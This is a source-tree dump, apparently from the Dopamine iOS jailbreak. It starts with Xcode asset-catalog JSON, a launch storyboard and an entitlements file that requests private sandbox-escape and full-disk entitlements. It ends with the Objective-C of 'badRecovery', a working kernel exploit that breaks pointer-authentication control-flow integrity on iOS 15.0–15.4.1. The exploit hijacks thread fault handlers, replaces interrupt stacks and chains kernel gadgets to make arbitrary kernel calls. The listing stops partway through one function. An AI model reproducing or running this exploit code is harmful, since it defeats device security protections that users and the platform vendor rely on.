      "filename" : "Icon-68@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "68x68"
    },
    {
      "filename" : "Icon-76@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "76x76"
    },
    {
      "filename" : "Icon-83.5@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "83.5x83.5"
    },
    {
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/AppIcon_Purple.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Icon-Notification@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Notification@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Small@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-Small@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-38@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-38@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-Small-40@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-Small-40@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-60@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-60@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-64@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-64@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-68@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "68x68"
    },
    {
      "filename" : "Icon-76@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "76x76"
    },
    {
      "filename" : "Icon-83.5@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "83.5x83.5"
    },
    {
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/AppIcon_Red.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Icon-Notification@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Notification@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Small@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-Small@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-38@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-38@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-Small-40@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-Small-40@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-60@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-60@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-64@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-64@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-68@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "68x68"
    },
    {
      "filename" : "Icon-76@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "76x76"
    },
    {
      "filename" : "Icon-83.5@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "83.5x83.5"
    },
    {
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Background/Background_Blue.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "blue.jpg",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Background/Background_ElleKit.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "ellekit.jpg",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Background/Background_Green.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "green.jpg",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Background/Background_Purple.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "purple.jpg",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Background/Background_Red.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "red.jpg",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Background/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Dopamine.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Dopamine.png",
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "filename" : "Dopamine@2x.png",
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "Dopamine@3x.png",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/DopamineLogo.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "DopamineLogo.pdf",
      "idiom" : "universal"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Loading.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Oval.png",
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Package Managers/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Package Managers/Sileo.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "filename" : "AppIcon83.5x83.5@2x.png",
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/Package Managers/Zebra.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "filename" : "icon_83.5@2x.png",
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/alpha-gradient.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Rectangle.png",
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Base.lproj/LaunchScreen.storyboard`:

```storyboard
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<document type="com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB" version="3.0" toolsVersion="13122.16" targetRuntime="iOS.CocoaTouch" propertyAccessControl="none" useAutolayout="YES" launchScreen="YES" useTraitCollections="YES" useSafeAreas="YES" colorMatched="YES" initialViewController="01J-lp-oVM">
    <dependencies>
        <plugIn identifier="com.apple.InterfaceBuilder.IBCocoaTouchPlugin" version="13104.12"/>
        <capability name="Safe area layout guides" minToolsVersion="9.0"/>
        <capability name="documents saved in the Xcode 8 format" minToolsVersion="8.0"/>
    </dependencies>
    <scenes>
        <!--View Controller-->
        <scene sceneID="EHf-IW-A2E">
            <objects>
                <viewController id="01J-lp-oVM" sceneMemberID="viewController">
                    <view key="view" contentMode="scaleToFill" id="Ze5-6b-2t3">
                        <rect key="frame" x="0.0" y="0.0" width="375" height="667"/>
                        <autoresizingMask key="autoresizingMask" widthSizable="YES" heightSizable="YES"/>
                        <color key="backgroundColor" xcode11CocoaTouchSystemColor="systemBackgroundColor" cocoaTouchSystemColor="whiteColor"/>
                        <viewLayoutGuide key="safeArea" id="6Tk-OE-BBY"/>
                    </view>
                </viewController>
                <placeholder placeholderIdentifier="IBFirstResponder" id="iYj-Kq-Ea1" userLabel="First Responder" sceneMemberID="firstResponder"/>
            </objects>
            <point key="canvasLocation" x="53" y="375"/>
        </scene>
    </scenes>
</document>

```

`Application/Dopamine/Dopamine.entitlements`:

```entitlements
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>platform-application</key>
	<true/>
	<key>proc_info-allow</key>
	<true/>
	<key>com.apple.private.persona-mgmt</key>
	<true/>
	<key>com.apple.private.tcc.allow</key>
	<array>
		<string>kTCCServiceSystemPolicyAllFiles</string>
	</array>
	<key>com.apple.private.security.storage-exempt.heritable</key>
	<true/>
	<key>com.apple.private.security.storage.AppBundles</key>
	<true/>
	<key>com.apple.private.security.no-sandbox</key>
	<true/>
	<key>com.apple.springboard.CFUserNotification</key>
	<true/>
	<key>com.apple.springboard.launchapplications</key>
	<true/>
	<key>com.apple.security.network.client</key>
	<true/>
	<key>com.apple.private.mobileinstall.allowedSPI</key>
	<array>
		<string>InstallForLaunchServices</string>
		<string>Install</string>
		<string>UninstallForLaunchServices</string>
		<string>Uninstall</string>
		<string>UpdatePlaceholderMetadata</string>
	</array>
	<key>com.apple.security.exception.iokit-user-client-class</key>
	<array>
		<string>AGXDevice</string>
		<string>AGXDeviceUserClient</string>
		<string>AGXSharedUserClient</string>
		<string>AGXGLContext</string>
		<string>AGXCommandQueue</string>
		<string>IOSurfaceRoot</string>
		<string>IOSurfaceRootUserClient</string>
		<string>AppleJPEGDriverUserClient</string>
        <string>H11ANEInDirectPathClient</string>
	</array>
	<key>com.apple.developer.kernel.extended-virtual-addressing</key>
	<true/>
	<key>com.apple.developer.kernel.increased-memory-limit</key>
	<true/>
</dict>
</plist>

```

`Application/Dopamine/Exploits/badRecovery/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>DPExploitFlavors</key>
	<dict>
		<key>default</key>
		<dict>
			<key>DPFlavorPriority</key>
			<integer>1000</integer>
			<key>DPSupportedRanges</key>
			<array>
				<dict>
					<key>Start</key>
					<string>15.0</string>
					<key>End</key>
					<string>15.4.1</string>
				</dict>
			</array>
			<key>DPSupportInclude</key>
			<array>
				<dict>
					<key>Builds</key>
					<array>
						<string>19F5047e</string>
						<string>19F5057e</string>
						<string>19F5062g</string>
					</array>
				</dict>
			</array>
		</dict>
	</dict>
	<key>DPExploitType</key>
	<string>PAC</string>
	<key>CFBundleDisplayName</key>
	<string>badRecovery</string>
</dict>
</plist>

```

`Application/Dopamine/Exploits/badRecovery/badRecovery.h`:

```h
//
//  badRecovery.h
//  Dopamine
//
//  Created by Lars Fröder on 25.01.24.
//

#ifndef badRecovery_h
#define badRecovery_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <libjailbreak/kcall_Fugu14.h>

typedef struct {
    bool inited;
    thread_t gExploitThread;
    uint64_t gScratchMemKern;
    volatile uint64_t *gScratchMemMapped;
    volatile uint64_t *gReturnValMemMapped;
    arm_thread_state64_t gExploitThreadState;
    uint64_t gSpecialMemRegion;
    uint64_t gIntStack;
    uint64_t gOrigIntStack;
    uint64_t gReturnContext;
    uint64_t gACTPtr;
    uint64_t gACTVal;
    uint64_t gCPUData;
} exploitThreadInfo;

bool breakCFI(void);
void deinitFugu15PACBypass(void);

void fugu15_kexec_on_thread(exploitThreadInfo *info, kRegisterState *state);

bool kexec_on_new_thread(kRegisterState *kState, thread_t *thread);

uint64_t fugu15_kcall(uint64_t func, int argc, const uint64_t *argv);
void fugu15_kexec(kRegisterState state);

#endif /* badRecovery_h */

```

`Application/Dopamine/Exploits/badRecovery/badRecovery.m`:

```m
//
//  badRecovery.m
//  badRecovery
//
//  Created by Lars Fröder on 25.01.24.
//

#import <Foundation/Foundation.h>

#include "badRecovery.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <ptrauth.h>
#include <IOKit/IOKitLib.h>

#include <libjailbreak/primitives.h>
#include <libjailbreak/translation.h>
#include <libjailbreak/info.h>
#include <libjailbreak/kernel.h>
#include <libjailbreak/util.h>

#define guard(cond) if (__builtin_expect(!!(cond), 1)) {}
#define DBGPRINT_ADDRVAR(var) printf("[DBG] %s: %s @ %p\n", __func__, #var, (void*) var)
#define DBGPRINT_VAR(var)     printf("[DBG] %s: %s: %p\n", __func__, #var, (void*) (uint64_t) var)
#define MEMORY_BARRIER asm volatile("dmb sy");

void pac_exploit_thread(void);
void pac_exploit_doIt(void);
void pac_loop(void);

uint64_t mapKernelPage(uint64_t addr);
uint64_t getUserReturnThreadContext(void);

exploitThreadInfo fugu15ExploitThread;
Fugu14KcallThread fugu14KcallThread;
uint64_t stack[1024];

uint64_t ensureSpecialMem(uint64_t cur)
{
    uint64_t mapped = cur;
    while (mapped == 0 || kvtophys(mapped + 0x4000ULL)) {
        if (kalloc_with_options(&mapped, 0x4000, KALLOC_OPTION_LOCAL) != 0) {
            puts("[-] ensureSpecialMem: Failed to allocate");
            break;
        }
    }
    return mapped;
}

/*
 * This function breaks Control Flow Integrity by obtaining
 * a signed thread fault handler address to an unprotected ret.
 *
 * Unprotected handlers can be found in xnu/osfmk/arm64/machine_routines_asm.s
 * See label 9 in both hw_lock_trylock_mask_allow_invalid and hw_lck_ticket_reserve_orig_allow_invalid
 *
 * (This implementation targets hw_lck_ticket_reserve_orig_allow_invalid)
 */
bool breakCFI(void)
{
    
    // Get this thread
    uint64_t thisThread = kread_ptr(task_self() + koffsetof(task, threads));
    //uint64_t thisThread = portKObject()
    guard (thisThread != 0) else {
        puts("[-] breakCFI: Failed to find this thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(thisThread);
    
    // Create a new thread
    thread_t chThread = 0;
    bzero(&fugu15ExploitThread.gExploitThreadState, sizeof(fugu15ExploitThread.gExploitThreadState));
    
    uint64_t thStack = ((uint64_t) &stack[512]) & ~0xFULL;
    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_thread);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_constant((void*) 0x41424344, ptrauth_key_function_pointer, 0));
    
    fugu15ExploitThread.gExploitThreadState.__x[20] = (uint64_t) mach_host_self();
    fugu15ExploitThread.gExploitThreadState.__cpsr = 0;
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT, &chThread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] breakCFI: Failed to create thread!");
        return false;
    }
    
    // Find it
    uint64_t chThreadPtr = task_get_ipc_port_kobject(task_self(), chThread);
    
    guard (chThreadPtr != 0) else {
        puts("[-] breakCFI: Failed to find child thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(chThreadPtr);
    
    // Create another thread
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    arm_thread_state64_t other;
    memcpy(&other, &fugu15ExploitThread.gExploitThreadState, sizeof(other));
    
    uint64_t returnThreadACTContext = getUserReturnThreadContext();
    guard (returnThreadACTContext != 0) else {
        puts("[-] breakCFI: getUserReturnThreadContext failed!");
        return false;
    }
    
    fugu15ExploitThread.gReturnContext = returnThreadACTContext;

    // Map exploit thread
    uint64_t mapAddr = mapKernelPage(chThreadPtr);
    guard (mapAddr != 0) else {
        puts("[-] breakCFI: Failed to map thread!");
        return false;
    }
    
    uint64_t signedFaultHandler = 0;
    while ((signedFaultHandler | 0xFFFFFF8000000000ULL) != kgadget(hw_lck_ticket_reserve_orig_allow_invalid_signed)) {
        signedFaultHandler = *(volatile uint64_t*)(mapAddr + koffsetof(thread, recover));
    }
    
    puts("[+] breakCFI: Obtained signed fault handler!!!");
    
    DBGPRINT_ADDRVAR(signedFaultHandler);
    
    // Capture some cpu_data struct
    uint64_t cpuData = 0;
    while (cpuData == 0) {
        cpuData = *(uint64_t*)(mapAddr + koffsetof(thread, machine_CpuDatap));
    }
    
    fugu15ExploitThread.gCPUData = cpuData;
    
    // Allocate a new interrupt stack for that CPU
    uint64_t intStack = 0;
    if (kalloc_with_options(&intStack, 0x4000 * 4, KALLOC_OPTION_LOCAL) != 0) {
        puts("[-] breakCFI: Failed to allocate interrupt stack");
        return false;
    }
    intStack += 0x8000;
    fugu15ExploitThread.gIntStack = intStack;
    
    fugu15ExploitThread.gOrigIntStack = kread64(cpuData + 0x10ULL);
    
    DBGPRINT_ADDRVAR(fugu15ExploitThread.gOrigIntStack);
    
    // Replacing the interrupt stack *should* be safe, unless:
    // 1. Something is running on the old interrupt stack AND
    // 2. That code causes a synchronous exception
    // (Which never happens)
    kwrite64(cpuData + 0x10ULL, intStack);
    kwrite64(cpuData + 0x18ULL, intStack);
    
    DBGPRINT_ADDRVAR(intStack);
    
    // Suspend and abort the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Our gadgets
    uint64_t brx22           = kgadget(br_x22); // Weird gadget, first signs x22, then jumps to it
    uint64_t signGadget      = ksymbol(hw_lck_ticket_reserve_orig_allow_invalid) + 4;
    uint64_t exceptionReturn = ksymbol(exception_return);
    
    // Set new state
    // This state will be reflected in the kernel
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0x4142434400ULL | i;
    }
    
    uint64_t origACT = *(uint64_t*)(mapAddr + koffsetof(thread, machine_contextData));
    fugu15ExploitThread.gACTPtr = chThreadPtr + koffsetof(thread, machine_contextData);
    fugu15ExploitThread.gACTVal = origACT;
    
    fugu15ExploitThread.gExploitThreadState.__x[10] = origACT;  // ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[11] = mapAddr;
    fugu15ExploitThread.gExploitThreadState.__x[16] = chThreadPtr - koffsetof(thread, recover) + koffsetof(thread, machine_contextData); // Restore ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[17] = brx22;
    
    fugu15ExploitThread.gSpecialMemRegion = ensureSpecialMem(fugu15ExploitThread.gSpecialMemRegion);
    
    fugu15ExploitThread.gExploitThreadState.__x[18] = fugu15ExploitThread.gSpecialMemRegion + 0x4000ULL - 0x140ULL;
    fugu15ExploitThread.gExploitThreadState.__x[19] = intStack + 0x3FF0ULL;
    fugu15ExploitThread.gExploitThreadState.__x[20] = cpuData;
    fugu15ExploitThread.gExploitThreadState.__x[21] = returnThreadACTContext;
    fugu15ExploitThread.gExploitThreadState.__x[22] = exceptionReturn;
    fugu15ExploitThread.gExploitThreadState.__x[23] = -1;
    fugu15ExploitThread.gExploitThreadState.__x[25] = koffsetof(thread, machine_CpuDatap);
    fugu15ExploitThread.gExploitThreadState.__x[26] = koffsetof(thread, machine_kstackptr);
    fugu15ExploitThread.gExploitThreadState.__x[27] = koffsetof(thread, machine_contextData);

    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, 0x414243441DULL);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, 0x414243441EULL);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_doIt);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_unauthenticated((void*) signGadget, ptrauth_key_function_pointer, 0));
    
    // Set thread fault handler
    kwrite64(chThreadPtr + koffsetof(thread, recover), signedFaultHandler);

    puts("GO!");
    
    // Set state and wait for boom!
    thread_set_state(chThread, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(chThread);
    
    uint64_t brx22Handler = 0;
    uint64_t datStack = 0;
    while ((brx22Handler | 0xFFFFFF8000000000ULL) != kgadget(br_x22)) {
        brx22Handler = *(volatile uint64_t*)(mapAddr + koffsetof(thread, recover));
        if (datStack == 0) {
            datStack = *(volatile uint64_t*)(mapAddr + koffsetof(thread, machine_kstackptr));
        }
    }
    
    puts("[+] breakCFI: Obtained signed br x22 fault handler!!!");
    DBGPRINT_ADDRVAR(datStack);
    
    // Stop the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Set new thread fault handler
    kwrite64(chThreadPtr + koffsetof(thread, recover), brx22Handler);
    
    kalloc(&fugu15ExploitThread.gScratchMemKern, 0x8000);
    fugu15ExploitThread.gScratchMemMapped   = (void *)mapKernelPage(fugu15ExploitThread.gScratchMemKern);
    fugu15ExploitThread.gReturnValMemMapped = (void *)mapKernelPage(fugu15ExploitThread.gScratchMemKern + 0x4000) + 0x3FF8;
    fugu15ExploitThread.gExploitThread = chThread;
    fugu15ExploitThread.inited = true;
    
    gPrimitives.kcall = fugu15_kcall;
    
    return true;
}

void deinitFugu15PACBypass(void)
{
    if (fugu15ExploitThread.inited) {
        fugu15ExploitThread.inited = false;
        
        kwrite64(fugu15ExploitThread.gCPUData + 0x10ULL, fugu15ExploitThread.gOrigIntStack);
        kwrite64(fugu15ExploitThread.gCPUData + 0x18ULL, fugu15ExploitThread.gOrigIntStack);
    }
}

/*
 * Execute the given CPU state.
 */
void fugu15_kexec_on_thread(exploitThreadInfo *info, kRegisterState *state)
{
    uint64_t ldp_x0_x1       = kgadget(ldp_x0_x1_x8);
    uint64_t exceptionReturnAfterCheck = kgadget(exception_return_after_check);
    uint64_t exceptionReturnNoLR = kgadget(exception_return_after_check_no_restore);
    uint64_t str_x8_x9 = kgadget(str_x8_x9);

    uint64_t realStateKern    = info->gScratchMemKern + 0x10 + (sizeof(kRegisterState) * 2);
    kRegisterState *realState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + (sizeof(kRegisterState) * 2));
    memcpy(realState->x, state->x, sizeof(state->x));
    
    realState->sp = info->gIntStack + 0x3000 - 0x10;
    realState->fp = state->fp;

    uint64_t restoreACTStateKern    = info->gScratchMemKern + 0x10 + sizeof(kRegisterState);
    kRegisterState *restoreACTState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + sizeof(kRegisterState));
    restoreACTState->x[0]  = realStateKern;
    restoreACTState->x[1]  = state->pc;
    restoreACTState->x[2]  = state->cpsr;
    restoreACTState->x[3]  = state->lr;
    restoreACTState->x[8]  = info->gACTVal;
    restoreACTState->x[9]  = info->gACTPtr;
    restoreACTState->x[22] = 0;
    restoreACTState->x[23] = 0;
    restoreACTState->sp    = info->gScratchMemKern;

    kRegisterState *state1 = (kRegisterState*) &info->gScratchMemMapped[2];
    state1->x[0]  = restoreACTStateKern;
    state1->x[1]  = str_x8_x9;
    state1->x[2]  = CPSR_KERN_INTR_DIS;
    state1->x[3]  = exceptionReturnAfterCheck;
    state1->x[22] = 0;
    state1->x[23] = 0;
    state1->sp    = info->gScratchMemKern;

    info->gScratchMemMapped[0] = info->gScratchMemKern + 0x10;    // x0 -> Our first new context
    info->gScratchMemMapped[1] = exceptionReturnAfterCheck; // x1 -> PC

    // Now do an arbitrary kcall
    // Using the br x22 handler, first jump to our ldp x0, x1 gadget
    // Then return into the middle of exception_return, right after authenticating the thread state
    info->gExploitThreadState.__x[2]  = CPSR_KERN_INTR_DIS; // CPSR
    info->gExploitThreadState.__x[3]  = 0;                  // FPSR
    info->gExploitThreadState.__x[4]  = 0;                  // FPCR
    info->gExploitThreadState.__x[8]  = info->gScratchMemKern; // For the ldp x0, x1, [x8] gadget
    info->gExploitThreadState.__x[22] = ldp_x0_x1;
    arm_thread_state64_set_lr_fptr(info->gExploitThreadState, ptrauth_sign_unauthenticated((void*)exceptionReturnNoLR, ptrauth_key_function_pointer, 0));
    
    info->gSpecialMemRegion = ensureSpecialMem(info->gSpecialMemRegion);
    
    info->gExploitThreadState.__x[16] = state->x[16];
    info->gExploitThreadState.__x[17] = state->x[17];
    info->gExploitThreadState.__x[18] = info->gSpecialMemRegion + 0x4000ULL - 0x140ULL;

    thread_set_state(info->gExploitThread, ARM_THREAD_STATE64, (thread_state_t) &info->gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(info->gExploitThread);
}


uint64_t fugu15_kcall_on_thread(exploitThreadInfo *info, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8)
{
    uint64_t exceptionReturn    = ksymbol(exception_return);
    uint64_t str_x0_x19_ldr_x20 = kgadget(str_x0_x19_ldr_x20);
    
    kRegisterState kcallState;
    
    kcallState.x[0] = a1;
    kcallState.x[1] = a2;
    kcallState.x[2] = a3;
    kcallState.x[3] = a4;
    kcallState.x[4] = a5;
    kcallState.x[5] = a6;
    kcallState.x[6] = a7;
    kcallState.x[7] = a8;
    
    kcallState.x[19] = info->gScratchMemKern + 0x7FF8; // Where x0 should be stored
    kcallState.x[20] = 0x0;             // Invalid address
    kcallState.x[21] = info->gReturnContext;  // Userspace context
    kcallState.x[22] = exceptionReturn; // br x22 gadget
    kcallState.x[23] = -1;              // Required for br x22 gadget
    
    kcallState.pc = func;
    kcallState.lr = str_x0_x19_ldr_x20; // This will crash (intended) and then continue via br x22 fault handler
    kcallState.cpsr = CPSR_KERN_INTR_DIS;

    fugu15_kexec_on_thread(info, &kcallState);
    
    *info->gReturnValMemMapped = 0xDEADBEEFCAFEBABEULL;
    uint64_t set = 0xDEADBEEFCAFEBABEULL;
    uint64_t res = set;
    while (res == set) {
        res = *info->gReturnValMemMapped;
    }
    
    // Stop the thread
    thread_suspend(info->gExploitThread);
    thread_abort(info->gExploitThread);

    return res;
}

uint64_t fugu15_kcall(uint64_t func, int argc, const uint64_t *argv)
{
    if (argc > 8) return 0;
    uint64_t a1 = argc >= 1 ? argv[0] : 0;
    uint64_t a2 = argc >= 2 ? argv[1] : 0;
    uint64_t a3 = argc >= 3 ? argv[2] : 0;
    uint64_t a4 = argc >= 4 ? argv[3] : 0;
    uint64_t a5 = argc >= 5 ? argv[4] : 0;
    uint64_t a6 = argc >= 6 ? argv[5] : 0;
